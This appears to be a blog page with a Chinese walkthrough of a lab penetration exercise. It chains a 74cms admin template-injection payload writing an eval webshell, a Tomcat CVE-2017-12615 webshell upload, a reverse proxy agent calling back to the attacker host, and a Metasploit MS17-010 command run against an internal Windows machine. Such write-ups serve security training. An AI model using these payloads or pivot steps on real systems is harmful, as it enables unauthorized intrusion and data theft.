@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" lab2 精简思路\n1 10主机cms先拿shell，然后20主机cve拿shell，发现其有内网，扫到一个30主机，有永恒之蓝，搭建代理后msf直接打就行 74cms后台getshell漏洞-flag1 直接登登不了，扫描一下端口\n1 fscan.exe -h 192.168.10.10 发现47cms，admin / admin123456 弱口令登录后台\n发现他的版本，直接搜，找到一个rce的payload打\n">
+<title>cyber-lab2</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/cyber-lab2/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="cyber-lab2">
+<meta property='og:description' content=" lab2 精简思路\n1 10主机cms先拿shell，然后20主机cve拿shell，发现其有内网，扫到一个30主机，有永恒之蓝，搭建代理后msf直接打就行 74cms后台getshell漏洞-flag1 直接登登不了，扫描一下端口\n1 fscan.exe -h 192.168.10.10 发现47cms，admin / admin123456 弱口令登录后台\n发现他的版本，直接搜，找到一个rce的payload打\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/cyber-lab2/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2026-01-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-12T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="cyber-lab2">
+<meta name="twitter:description" content=" lab2 精简思路\n1 10主机cms先拿shell，然后20主机cve拿shell，发现其有内网，扫到一个30主机，有永恒之蓝，搭建代理后msf直接打就行 74cms后台getshell漏洞-flag1 直接登登不了，扫描一下端口\n1 fscan.exe -h 192.168.10.10 发现47cms，admin / admin123456 弱口令登录后台\n发现他的版本，直接搜，找到一个rce的payload打\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#74cms后台getshell漏洞-flag1">74cms后台getshell漏洞-flag1</a></li>
+        <li><a href="#tomcat-cve-2017-12615-rce-flag2">tomcat-cve-2017-12615-rce-flag2</a></li>
+        <li><a href="#ms17-010-flag3">ms17-010-flag3</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cyber-lab2/">cyber-lab2</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-12</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="lab2">lab2
+</h1><p>精简思路</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10主机cms先拿shell，然后20主机cve拿shell，发现其有内网，扫到一个30主机，有永恒之蓝，搭建代理后msf直接打就行
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="74cms后台getshell漏洞-flag1">74cms后台getshell漏洞-flag1
+</h3><p>直接登登不了，扫描一下端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fscan.exe -h 192.168.10.10
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab2/image-20260112145311354.png"
+	width="1441"
+	height="242"
+	srcset="/p/cyber-lab2/image-20260112145311354_hu_57602594ee846ab7.png 480w, /p/cyber-lab2/image-20260112145311354_hu_a2e6ac5813483a50.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112145311354"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="595"
+		data-flex-basis="1429px"
+	
+></p>
+<p>发现47cms，admin / admin123456 弱口令登录后台</p>
+<p><img src="/p/cyber-lab2/image-20260112145358594.png"
+	width="658"
+	height="151"
+	srcset="/p/cyber-lab2/image-20260112145358594_hu_cf408b5565f53f41.png 480w, /p/cyber-lab2/image-20260112145358594_hu_9f94e0798489c56e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112145358594"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="435"
+		data-flex-basis="1045px"
+	
+></p>
+<p>发现他的版本，直接搜，找到一个rce的payload打</p>
+<p>[74cms v4.2.1 v4.2.129 后台getshell漏洞 - Wiki](<a class="link" href="https://l1ubai.github.io/vuldb/Web"  target="_blank" rel="noopener"
+    >https://l1ubai.github.io/vuldb/Web</a>安全/74cms/74cms v4.2.1 - v4.2.129-后台getshell漏洞/)</p>
+<p><img src="/p/cyber-lab2/image-20260112145535313.png"
+	width="1531"
+	height="228"
+	srcset="/p/cyber-lab2/image-20260112145535313_hu_8b81d3d31a910444.png 480w, /p/cyber-lab2/image-20260112145535313_hu_478b7ceddf2895ed.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112145535313"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="671"
+		data-flex-basis="1611px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#39;,&#39;a&#39;,eval($_POST[&#39;1&#39;]),&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>保存在了<code>/Application/Home/Conf/config.php</code>,连蚁剑直接拿flag</p>
+<p><img src="/p/cyber-lab2/image-20260112145924881.png"
+	width="445"
+	height="154"
+	srcset="/p/cyber-lab2/image-20260112145924881_hu_7cad8ff84e00acc9.png 480w, /p/cyber-lab2/image-20260112145924881_hu_f66f31293c427787.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112145924881"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="693px"
+	
+></p>
+<h3 id="tomcat-cve-2017-12615-rce-flag2">tomcat-cve-2017-12615-rce-flag2
+</h3><p>发现此机子没内网，那上传fscan扫</p>
+<p><img src="/p/cyber-lab2/image-20260112150131074.png"
+	width="617"
+	height="208"
+	srcset="/p/cyber-lab2/image-20260112150131074_hu_9807bffa89f0c2d6.png 480w, /p/cyber-lab2/image-20260112150131074_hu_e1a882e1be160887.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112150131074"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="296"
+		data-flex-basis="711px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fscan.exe -h 192.168.10.10/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab2/image-20260112150805847.png"
+	width="1252"
+	height="156"
+	srcset="/p/cyber-lab2/image-20260112150805847_hu_8d878579c4903943.png 480w, /p/cyber-lab2/image-20260112150805847_hu_f7f57477b22a4b5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112150805847"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="802"
+		data-flex-basis="1926px"
+	
+></p>
+<p>发现一个<code>tomcat-cve-2017-12615-rce</code>,搜一下直接打，参考下文</p>
+<p><a class="link" href="https://l1ubai.github.io/vuldb/Web%E5%AE%89%E5%85%A8/Tomcat/Tomcat%20%E5%90%8E%E5%8F%B0%E9%83%A8%E7%BD%B2war%E6%9C%A8%E9%A9%ACgetshell/"  target="_blank" rel="noopener"
+    >https://l1ubai.github.io/vuldb/Web%E5%AE%89%E5%85%A8/Tomcat/Tomcat%20%E5%90%8E%E5%8F%B0%E9%83%A8%E7%BD%B2war%E6%9C%A8%E9%A9%ACgetshell/</a></p>
+<p>打直接要进入后台/manager/html，要用户密码，抓包发现用户密码在Authorization，直接爆破，发现爆破不出，有问题啊？</p>
+<p><a class="link" href="https://blog.csdn.net/x319427393/article/details/126210083"  target="_blank" rel="noopener"
+    >记一次暴力破解tomcat后台密码（附带python脚本）_tomcat后台登录字典-CSDN博客</a></p>
+<img src="image-20260112152214768.png" alt="image-20260112152214768" style="zoom:50%;" />
+<p>看别人wp，先用哥斯拉生成一个马，直接put</p>
+<p><img src="/p/cyber-lab2/image-20260112161245146.png"
+	width="1052"
+	height="394"
+	srcset="/p/cyber-lab2/image-20260112161245146_hu_d748ff3574cb70e5.png 480w, /p/cyber-lab2/image-20260112161245146_hu_5418bf43a6dd2f8.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112161245146"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="640px"
+	
+></p>
+<p>哥斯拉直接连</p>
+<p><img src="/p/cyber-lab2/image-20260112161228948.png"
+	width="820"
+	height="471"
+	srcset="/p/cyber-lab2/image-20260112161228948_hu_5a03a9cb1bdef192.png 480w, /p/cyber-lab2/image-20260112161228948_hu_3f0a50f45de4ed80.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112161228948"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="417px"
+	
+></p>
+<p>拿到flag2</p>
+<p><img src="/p/cyber-lab2/image-20260112161439849.png"
+	width="959"
+	height="270"
+	srcset="/p/cyber-lab2/image-20260112161439849_hu_e69e2b7654031a5c.png 480w, /p/cyber-lab2/image-20260112161439849_hu_55fac986e355cf93.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112161439849"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="355"
+		data-flex-basis="852px"
+	
+></p>
+<h3 id="ms17-010-flag3">ms17-010-flag3
+</h3><p>主机存在内网</p>
+<p><img src="/p/cyber-lab2/image-20260112161743388.png"
+	width="541"
+	height="398"
+	srcset="/p/cyber-lab2/image-20260112161743388_hu_93b8f2fb6c63d397.png 480w, /p/cyber-lab2/image-20260112161743388_hu_81fc700bfedbca8d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112161743388"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="135"
+		data-flex-basis="326px"
+	
+></p>
+<p>将fscan和windows_x64_agent.exe上传上去，先扫</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fscan.exe  -h 192.168.20.20/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab2/image-20260112163111160.png"
+	width="1064"
+	height="70"
+	srcset="/p/cyber-lab2/image-20260112163111160_hu_1c608009b7e5d378.png 480w, /p/cyber-lab2/image-20260112163111160_hu_731b6e78988a3378.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112163111160"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1520"
+		data-flex-basis="3648px"
+	
+></p>
+<p>发现一个ms17-101,先建代理，kaili</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 172.16.233.2:8000 -s 123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">win_agent.exe -c 172.16.233.2:8000 -s 123 --reconnect 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（这里又卡了一下，又是虚拟机不能访问网址，这次我kali连vpn都没用，<strong>后面发现是路由问题</strong>，这里要注意）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo openvpn --config cyberstrikelab.com-lab2.ovpn --keepalive 10 60 &amp;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ip route del 0.0.0.0/1 via 172.16.233.1
+</span></span><span class="line"><span class="cl">sudo ip route del 128.0.0.0/1 via 172.16.233.1
+</span></span><span class="line"><span class="cl"># 2. 添加目标网络路由（最关键的一步！）
+</span></span><span class="line"><span class="cl">sudo ip route add 192.168.10.0/24 via 172.16.233.1 dev tun0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就是，<strong>这个哥斯拉也要放在虚拟机上执行，因为是kali开的vpn！</strong>，不然代理搭不成！</p>
+<img src="image-20260112173835691.png" alt="image-20260112173835691" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 msfconsole
+</span></span><span class="line"><span class="cl">use auxiliary/admin/smb/ms17_010_command
+</span></span><span class="line"><span class="cl">set RHOSTS 192.168.20.30
+</span></span><span class="line"><span class="cl">set COMMAND type C:\\flag.txt
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab2/image-20260112174055642.png"
+	width="898"
+	height="465"
+	srcset="/p/cyber-lab2/image-20260112174055642_hu_7656a2f9948094ce.png 480w, /p/cyber-lab2/image-20260112174055642_hu_92166b2a5c684981.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112174055642"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="463px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cyber-lab8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab8</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab6</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab7</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab5</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
